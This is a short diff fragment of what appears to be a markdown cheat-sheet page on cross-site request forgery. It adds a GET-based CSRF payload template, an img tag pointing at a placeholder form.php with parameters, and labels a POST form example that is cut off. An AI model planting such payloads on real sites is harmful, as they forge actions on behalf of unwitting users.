@@ -5,7 +5,12 @@ order: 2
 ---
 
 > **CSRF**
+GET:
+{% highlight html %}
+<img src="http://<ip_of_site>/form.php?<parameter>=<value>
+{% endhighlight %}
 
+POST:
 {% highlight html %}
 <form  ID=CSRF action="<website>" method="POST">
 
